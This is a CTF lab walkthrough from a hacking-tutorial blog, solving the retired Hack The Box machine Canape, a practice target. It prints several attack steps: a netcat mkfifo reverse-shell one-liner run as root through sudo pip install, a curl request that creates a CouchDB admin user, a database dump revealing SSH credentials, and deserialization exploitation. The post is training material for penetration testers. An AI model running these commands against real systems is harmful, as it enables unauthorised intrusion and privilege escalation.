<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">HacktheBox Challenge Canape Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-canape-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-09-24T10:42:57+00:00">September 24, 2018</time><time class="updated" datetime="2025-07-05T15:14:10+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “Canape” which is available online for those who want to increase their skill in penetration testing and black box testing. Canape is retired vulnerable lab presented by <strong>Hack the Box</strong> for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to Expert level.</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Intermediate</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> find <strong>user.txt</strong> and <strong>root.txt</strong> file on the victim’s machine.</span></p>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP and IP of Canape is <strong>10.10.10.70</strong> so let’s begin with nmap port enumeration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- -sV 10.10.10.70</pre>
<p><span style="color: #000000;">From the given below image, you can observe we found port 80 and 65535 are open on the target system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0mwkR5cZ7j8/W6i6mLR3ofI/AAAAAAAAae8/bDhk2KxrYDc2Y7tOcHdOys1dF_1g_HeNACEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">As port 80 is running http server, we open the target machine’s IP address in our browser and find that it is a fan site for the Simpsons.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-dkx7uHSZRFA/W6i6n7aJm2I/AAAAAAAAagA/SUbEiczZD94WJboP0JEYauCxJl0eoEiDgCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">We don’t find anything on the webpage, so we run the dirb scan to enumerate the directories. The target machine responded with 200 OK for every request but for the /.git/Head directory the size of the response changed.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.10.70 -f</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-n2gq4Pqne1s/W6i6obGxsFI/AAAAAAAAagE/BqAlRn_NqGohTqfEVgPsZY1kJEr29cWnACEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">We open the /.git/ directory and find the config file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-iOvwZF5MB_k/W6i6oujPnXI/AAAAAAAAagI/5ejQhblL6lQuzmNOCMTFyjOnTVAyA5fBACEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">When we open the config file, we find a domain name “<strong>git.canape.htb</strong>”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-kdPDmIf1GFQ/W6i6otj4vEI/AAAAAAAAagI/3rTI5dCkUtAf32i3ZDRISGedTvcjG3N-QCEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Now we have added the domain name of the target machine in <strong>the/etc/hosts</strong> file to access the webpage using the IP address as well as a domain name.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-6hZNMW0flNU/W6i6o5l_dRI/AAAAAAAAagQ/m1e5YlS0b8c-HJMwRolcaez5oTffH0DtQCEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now we can clone the local git repository using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone http://git.canape.htb/simpsons.git</pre>
<p><span style="color: #000000;">Here we found out a file named “<strong>__init__.py</strong>” in Simpson’s folder as shown in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-NpqGnwwIxsM/W6i6parnGgI/AAAAAAAAagM/7oxup7tKpzYal1bUWh8fMLi0GPJ2tQIVACEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">After downloading the files, we open “<strong>__init__.py</strong>” and find that this program might be <strong>vulnerable insecure deserialization</strong> as it uses a vulnerable function “<strong>cPickel.loads(data)</strong>”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-NWtCsF9Fbes/W6i6p5O_nEI/AAAAAAAAagU/JnzVwPXOgo4vYlX0ByccQFpRF5a6C4ztQCEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Now we create a program to exploit this vulnerability and get a reverse shell. You can download the exploit from <a style="color: #000000;" href="https://github.com/Sayantan5/Canape">here</a>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-r95vTBL0FW8/W6i6mOSUTuI/AAAAAAAAagU/ehK3X12Nrv01VFll4aHiTZQ5g0LAnaOowCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">We set up our listener “netcat” before running the program and run the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 443</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-psCcit1B8ZQ/W6i6mAmHHsI/AAAAAAAAagU/y_XmspulbhkKcWJCUhK0BWqgnlPGp4GOgCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">After getting a reverse shell, we start penetrating more and more. We check for the open ports in the target machine that might be listening locally and find that a service is running on <strong>port 5984 </strong>for the Apache CouchDB.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">netstat -antp</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-V_ef5hXkKf4/W6i6miCyWUI/AAAAAAAAagI/3roT5YQaoHsr-Om1mO4a8WPx9FL6GtbIQCEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Apache CouchDB is an open source database software. We check the version of CouchDB and also find all the databases using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl http://127.0.0.1:5984
curl http://127.0.0.1:5984/_all_dbs</pre>
<p><span style="color: #000000;">Using the above command, we find the version of CouchDB to be “2.0.0”. This version of CouchDB is vulnerable to remote privilege escalation. You can find more about this vulnerability <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html">here</a></span>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-YkuNZb08lqE/W6i6m4sgVKI/AAAAAAAAagQ/mrBHbMv_MV0UOlLxBIMx7lotJMUHYAPewCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Then we create a user with permissions to read the database with the following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl -X PUT 'http://localhost:5984/_users/org.couchDB.user:hack' --data-binary  '{ "type": "user", "name": "hack", "roles": ["_admin"], "roles": [], "password": "password" }’</pre>
<p><span style="color: #000000;">We then dump the database with the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl http://127.0.0.1:5984/passwords/_all_docs?include_docs=true -u hack:password</pre>
<p><span style="color: #000000;">The above command will dump the password and we will find the password for SSH login. Now, all we need to do is find the username.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-XesDY1Ru5Kk/W6i6nK9EAQI/AAAAAAAAagM/2yQPq6LQek4gjDwg09yJm3Nc6-8vo6oZACEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Then, open /etc/passwd to find users available on the target machine. We find that there is only one proper user called <strong>a homer</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /etc/passwd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-nX2zPvqb0Zc/W6i6nbfeAxI/AAAAAAAAagE/91twtilKrSYq232KQXGpEo_3wFMGw1JkQCEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">We login through SSH using the credentials we found earlier “<strong>homer:0B4jyA0xtytZi7esBNGp</strong>”. After login, we find a file ‘user.txt’. We open the file and find our first flag.</span></p>
<p><span style="color: #000000;">After getting the flag, we checked the sudoers list and find homer has permission to run “<strong>pip install *</strong>” as the root user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh homer@10.10.10.70 -p65535
ls
cat user.txt
sudo -l</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qWruFO5KGeA/W6i6nXYxcWI/AAAAAAAAagU/pUe11vB5TpE5AfsspBzxSmmA_6IJZeV-ACEwYBhgL/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Now as we know we can run “<strong>pip install *</strong>” as root, we are going to abuse it by creating a reverse shell and saving it as “<strong>setup.py</strong>”.</span></p>
<p><span style="color: #000000;">We are going to use netcat pipe one-liner to get a reverse shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.4 4444 &gt;/tmp/f</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-5jzDtTXPKas/W6i6ns90_zI/AAAAAAAAagE/fT6lmVkIZooYkTZKoZJSrh9YVsXpWBh-ACEwYBhgL/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Now we can run our reverse shell using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo pip install .</pre>
<p><span style="color: #000000;">Remember to set up the listener before running the above command.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ZvBJJ3nQFtQ/W6i6nx7LjKI/AAAAAAAAaf8/4sedymL4VX4_RueJhUgoi0_F0igOvYa3ACEwYBhgL/s1600/19.png"/></span></p>
<p><span style="color: #000000;">As soon as we run our command, we get our reverse shell as the root user. We now move to /root directory and to get “root.txt”. We take a look at the content of the file and find our final flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 4444
id
cd /root
ls
cat root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-bwqLWbd-8TI/W6i6oLtd2vI/AAAAAAAAagU/-QqG-6uaLwkTM9WJOXvTdLvXXAGkrVX2QCEwYBhgL/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this </span><strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contac</span>t <a href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
